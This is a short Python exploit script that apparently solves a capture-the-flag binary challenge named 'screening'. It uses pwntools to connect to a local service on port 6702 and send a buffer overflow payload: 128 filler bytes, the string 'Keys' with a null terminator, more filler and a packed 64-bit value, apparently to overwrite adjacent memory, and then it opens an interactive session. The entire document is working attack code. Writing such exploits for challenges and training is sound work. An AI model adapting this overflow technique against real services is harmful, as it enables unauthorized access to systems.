from pwn import *
r = remote('localhost',6702)
#r = process('./screening')
payload = b'A'*128 + b'Keys\0' + b'A'*11 + p64(1)
r.sendline(payload)
r.interactive()
